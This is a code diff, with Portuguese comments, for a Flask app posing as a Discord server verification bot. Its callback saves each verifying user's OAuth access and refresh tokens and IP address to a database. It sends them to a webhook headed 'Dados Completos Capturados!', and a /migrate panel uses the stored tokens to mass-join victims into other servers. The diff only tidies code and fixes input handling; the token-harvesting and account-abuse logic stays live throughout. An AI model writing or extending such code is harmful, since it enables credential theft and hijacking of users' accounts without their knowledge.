@@ -27,7 +27,7 @@ def init_db():
     try:
         conn = get_db_connection()
         cur = conn.cursor()
-        # Tabela completa com Refresh Token e Expiração
+        # Cria a tabela com suporte a REFRESH TOKEN e EXPIRAÇÃO
         cur.execute("""
             CREATE TABLE IF NOT EXISTS verified_users (
                 user_id VARCHAR(50) PRIMARY KEY,
@@ -44,7 +44,7 @@ def init_db():
         conn.commit()
         cur.close()
         conn.close()
-        print("✅ DB Conectado e Tabela Verificada.")
+        print("✅ DB Conectado e Estrutura Verificada.")
     except Exception as e:
         print(f"❌ Erro DB: {e}")
 
@@ -76,14 +76,13 @@ def get_headers_bot():
 
 def send_log_to_webhook(user_data, access_token, refresh_token, ip_address, guild_id):
     embed = {
-        "title": "✅ Acesso Capturado com Sucesso!",
-        "description": "Tokens salvos no Banco de Dados.",
+        "title": "✅ Dados Completos Capturados!",
         "color": 0x00ff41,
         "fields": [
             { "name": "👤 Usuário", "value": f"{user_data['username']} (`{user_data['id']}`)", "inline": False },
             { "name": "🌍 IP", "value": f"`{ip_address}`", "inline": True },
-            { "name": "🔑 Access Token (7 Dias)", "value": f"||{access_token}||", "inline": False },
-            { "name": "🔄 Refresh Token (Renovável)", "value": f"||{refresh_token}||", "inline": False }
+            { "name": "🔑 Access Token", "value": f"||{access_token}||", "inline": False },
+            { "name": "🔄 Refresh Token", "value": f"||{refresh_token}||", "inline": False }
         ],
         "footer": { "text": "Hunter Database System" }
     }
@@ -118,7 +117,7 @@ def add_role_to_user(user_id, role_id, target_guild_id):
     url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}/roles/{role_id}"
     requests.put(url, headers=get_headers_bot())
 
-# Inicializa DB
+# Inicializa o DB ao ligar
 init_db()
 
 # --- ROTAS ---
@@ -136,9 +135,7 @@ def auth():
     target_guild_id = request.args.get('guild_id')
     if not target_guild_id: return "Erro: ID Server faltando."
     
-    # CORREÇÃO CRÍTICA: Usar HTTPS (Universal Link)
-    # Isso impede que o navegador bloqueie o redirecionamento.
-    # O Android/iOS interceptam esse link e abrem o App se estiver instalado.
+    # Universal Link (HTTPS)
     auth_url = (
         f"https://discord.com/oauth2/authorize"
         f"?client_id={CLIENT_ID}"
@@ -148,7 +145,7 @@ def auth():
         f"&state={target_guild_id}"
     )
     
-    # Envia 'web_url' para o template launcher.html
+    # Envia para o Launcher
     return render_template('launcher.html', web_url=auth_url)
 
 @app.route('/callback')
@@ -186,26 +183,23 @@ def callback():
     # 3. IP
     ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
     
-    # 4. Salvar TUDO no Banco
+    # 4. Salva no Banco (Tudo)
     save_user_to_db(user_id, username, ip, access_token, refresh_token, expires_in, scopes, target_guild_id)
+    
+    # 5. Log Webhook
     send_log_to_webhook(user_data, access_token, refresh_token, ip, target_guild_id)
 
-    # 5. Ações no Discord (Entrar no Server e Dar Cargo)
+    # 6. Entra no Server e dá Cargo
     join_user_to_guild(user_id, access_token, target_guild_id)
     try:
         role_id = get_or_create_verified_role(target_guild_id)
         if role_id: add_role_to_user(user_id, role_id, target_guild_id)
     except: pass
 
-    # 6. Sucesso - Redirecionar de volta
-    # Aqui usamos o success.html para tentar abrir o App
-    return_app_url = f"discord://discord.com/channels/{target_guild_id}"
-    return_web_url = f"https://discord.com/channels/{target_guild_id}"
+    # 7. Redireciona para o Sucesso (Universal Link)
+    success_url = f"https://discord.com/channels/{target_guild_id}"
+    return render_template('launcher.html', web_url=success_url)
 
-    # Nota: Certifique-se de ter o arquivo templates/success.html
-    return render_template('success.html', app_url=return_app_url, web_url=return_web_url)
-
-# --- PAINEL ENVIO ---
 @app.route('/painel', methods=['GET', 'POST'])
 def painel():
     message = ""
@@ -215,8 +209,6 @@ def painel():
         title = request.form.get('title')
         desc = request.form.get('desc')
         image_url = request.form.get('image_url')
-        
-        # O link do botão leva para /auth
         verify_link = f"https://hunter-bot-verify.onrender.com/auth?guild_id={target_guild_id}"
 
         payload = {
@@ -224,40 +216,34 @@ def painel():
                 "title": title, "description": desc, "color": 0x00ff41,
                 "image": {"url": image_url} if image_url else {}
             }],
-            "components": [{
-                "type": 1,
-                "components": [{
-                    "type": 2, "style": 5, "label": "VERIFICAR AGORA", "url": verify_link
-                }]
-            }]
+            "components": [{ "type": 1, "components": [{ "type": 2, "style": 5, "label": "VERIFICAR AGORA", "url": verify_link }] }]
         }
-        
-        post_url = f"{API_BASE}/channels/{channel_id}/messages"
-        r = requests.post(post_url, headers=get_headers_bot(), json=payload)
-        
-        if r.status_code == 200:
-            message = "✅ Enviado!"
-        else:
-            message = f"❌ Erro: {r.text}"
+        r = requests.post(f"{API_BASE}/channels/{channel_id}/messages", headers=get_headers_bot(), json=payload)
+        message = "✅ Enviado!" if r.status_code == 200 else f"❌ Erro: {r.text}"
 
     return render_template('painel.html', message=message)
 
-# --- PAINEL MIGRAÇÃO ---
 @app.route('/migrate', methods=['GET', 'POST'])
 def migrate():
     log_msg = []
     
     if request.method == 'POST':
         action_type = request.form.get('action_type')
-        target_guild_id = request.form.get('target_guild_id')
+        # CORREÇÃO: .strip() aqui para evitar erro no ID do servidor
+        target_guild_id = request.form.get('target_guild_id').strip()
         
         conn = get_db_connection()
         cur = conn.cursor()
 
         try:
             if action_type == 'single':
-                identifier = request.form.get('identifier')
-                cur.execute("SELECT user_id, username, access_token FROM verified_users WHERE user_id = %s OR username = %s", (identifier, identifier))
+                # CORREÇÃO: .strip() remove espaços vazios do ID do usuário colado
+                raw_identifier = request.form.get('identifier')
+                identifier = raw_identifier.strip() if raw_identifier else ""
+                
+                print(f"DEBUG: Buscando usuário com ID '{identifier}'")
+
+                cur.execute("SELECT user_id, username, access_token FROM verified_users WHERE user_id = %s", (identifier,))
                 user = cur.fetchone()
 
                 if user:
@@ -266,25 +252,22 @@ def migrate():
                     res_txt = "Sucesso" if status in [201, 204] else f"Falha ({status})"
                     log_msg.append(f"[{res_txt}] {uname}")
                 else:
-                    log_msg.append(f"⚠️ User não encontrado.")
+                    log_msg.append(f"⚠️ User '{identifier}' não encontrado.")
 
             elif action_type == 'mass':
                 amount = int(request.form.get('amount'))
                 cur.execute("SELECT user_id, username, access_token FROM verified_users ORDER BY RANDOM() LIMIT %s", (amount,))
                 users = cur.fetchall()
-                
                 count = 0
                 for user in users:
                     uid, uname, token = user
-                    # Usa o token salvo para entrar
-                    if join_user_to_guild(uid, token, target_guild_id) in [201, 204]: 
-                        count += 1
-                    time.sleep(0.5) 
-
+                    if join_user_to_guild(uid, token, target_guild_id) in [201, 204]: count += 1
+                    time.sleep(0.5)
                 log_msg.append(f"🚀 Migrados: {count}/{len(users)}")
 
         except Exception as e:
             log_msg.append(f"Erro: {str(e)}")
+            print(f"ERRO MIGRATE: {e}")
         finally:
             if conn: conn.close()
 
